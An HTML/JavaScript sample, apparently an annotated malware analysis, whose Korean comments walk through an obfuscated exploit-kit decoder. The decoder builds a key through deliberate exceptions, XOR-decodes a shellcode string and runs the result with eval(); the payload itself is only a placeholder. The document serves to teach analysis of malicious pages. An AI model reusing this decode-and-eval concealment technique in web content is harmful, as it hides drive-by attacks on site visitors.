<html>
<script>

bUMg2 = "ShellCode";
WcFTN8 = "MaliciousScript String";

function YCacRnE3(){
	//KpDDiBW7, uWQev6, PxxMvIV6, QUfA4 등은 아래와 같이 치환됩니다.
	
	//KpDDiBW7	> 3.141592653
	//uWQev6 	> Math.tan()
	//PxxMvIV6 	> parseInt()
	//QUfA4 	> 'length'
	//OFIcMvh1 	> 'test'
	//JcdRRAN6	> 'replace'
	
	//aiIgUGs3 = parseInt(~((3.141592653&3.141592653)|(~3.141592653&3.141592653)&(3.141592653&~3.141592653)|(~3.141592653&~3.141592653)));
	//aiIgUGs3 	> 0
	
	//FtxO1 = parseInt(((0&0)|(~0&0)&(0&~0)|(~0&~0))&1);
	//FtxO1		> 1
	
	//DvBgVOe8 = 1<<1;
	//DvBgVOe8	> 2

	new function(){
		//정규표현식에 의거하여 v, @, 0, e, l, 9, a 가 아닌 모든 문자를 삭제하고 qyBWA7에 저장합니다.
		//결과적으로 qyBWA7에 저장되는 것은 eval입니다. qyBWA7을 사용하면 eval() 함수를 호출하는 것과 같습니다.
		qyBWA7 = 'eval';
		
	};
		
	//Line 36에서 exception이 발생합니다. jGlc5는 선언되어 있는 변수가 아니기 때문입니다.
	//try-catch 구문에 의해 jGlc5에 0이 할당됩니다.
	try{
		if(!/^\d*$/g['test'](jGlc5));
	}catch(e){
		jGlc5 = 0;
	}
	
	jwPd5='';
	
	//0부터 WcFTN8 변수의 문자열 길이만큼 반복됩니다.
	for(WxPSN0=0; WxPSN0 < WcFTN8.length; WxPSN0-=-1/*mWQywTw0+=1과 같음*/)
	{
		//시프트 연산에 대한 설명은 생략하겠습니다.
		jGlc5=((jGlc5&127)<<25)|((jGlc5&4294967168)>>>7)+WcFTN8.charCodeAt(WxPSN0);
	}
	
	//Line 57에서 uWyDr4는 선언되어 있지 않은 변수이므로 exception이 발생합니다. 
	//exception으로 인해 YCacRnE3() 함수 코드 동작이 중단됩니다. 
	//Line 114로 가보면 try - catch 문에 의해 uWyDr4 변수에 0이 할당되고 다시 YCacRnE3() 함수를 호출합니다.
	//YCacRnE3() 함수 호출로 인해 Line 26 - 48 과정을 다시 반복하게 됩니다. 
	
	//이렇게 두 번의 동작을 거쳐 Line 47의 jGlc5에 입력되는 값은 복호화 키를 만들 때 사용됩니다.
	uWyDr4+=1;
	jGlc5>>>=0;
	
	//WxPSN0, mBbC4에 각각 0과 1을 할당합니다.
	//bUMg2에는 ShellCode가 들어가있고 그 길이가 11584이므로 Line 62 - 89 코드가 5792번 반복됩니다.
	for(WxPSN0=0,mBbC4=1; WxPSN0 < bUMg2.length; WxPSN0+=2,mBbC4++)
	{
		//for 구문이 4번 실행되는 것을 한 싸이클로 봤을 때,
		//EpewY4에는 0,2,4,6이 반복으로 들어갑니다.
		if(WxPSN0>=8){
			EpewY4=WxPSN0%8;
		}else {
			EpewY4=WxPSN0;
		}
		
		//jGlc5에는 565,940,520 값이 들어가 있습니다.
		//이 값은 toString(16)에 의해 16진수 형태인 21BB9128로 변환됩니다.
		//substr() 함수를 사용해서 다시 21, BB, 91, 28 로 자르고 앞에 0x를 붙입니다.
		//그리고 parseInt() 함수를 사용해서 10진수로 변환합니다.
		bdogJxA1=parseInt('0x'+jGlc5.toString(16).substr(EpewY4,2))+mBbC4;
		
		//조건문에서 정규표현식을 사용해서 bdogJxA1에 744 를 더한 값이 1000을 넘는지 확인합니다.
		//bdogJxA1이 FF라면 10진수로 255 입니다. 여기에 744를 더하면 999가 됩니다. 
		//결과적으로 1000 이상의 값이 나오면 아스키 문자의 값을 가질 수 없습니다.
		//for 문에 의해 bdogJxA1는 계속 증가하므로 FF를 넘어갔을 때 67으로 나눈 나머지를 저장하는 형태입니다.
		if(/^(\d{4})/g['test'](bdogJxA1+744))
			bdogJxA1%=67;
		
		//Line 87은 최종적으로 bUMg2의 난독화를 해제하는 코드입니다.
		//연산 과정을 거치고 난 뒤 fromCharCode()에 의해 아스키 문자로 변환됩니다.
		//변환된 값은 jwPd5에 차곡차곡 저장되어 공격 코드가 완성됩니다.
		jwPd5 += fromCharCode(parseInt('0x'+bUMg2.charAt(WxPSN0)+bUMg2.charAt(WxPSN0+parseInt(1)))^bdogJxA1);
	}
	
	//jwPd5에 저장된 공격 코드는 Line 95의 eval() 함수 호출로 동작하게 됩니다.
	//실행 과정에서 문제가 발생한다면 Line 98 - 104 코드가 동작합니다.
	//해당 동작은 아무런 의미가 없습니다.
	try{
		new function(){
			eval(jwPd5);
		}
	}catch(e){
		try{
			new function(){
				aDLr3=parseInt;
				Math.tan(jwPd5);
			}
		}catch(e) {
			window.location='about:blank';}
	}
}

//YCacRnE3() 함수를 호출합니다.
//그러나 실행 도중에 Line 56에서 exception이 발생하고 
//YCacRnE3() 함수가 한번 더 실행되는 구조입니다.
try{
	eval('YCacRnE3();');
}catch(e) {
	try{
		uWyDr4 = 0;
		eval('YCacRnE3();');
	}catch(e){
		alert('ere');
	}
}
</script>
</html>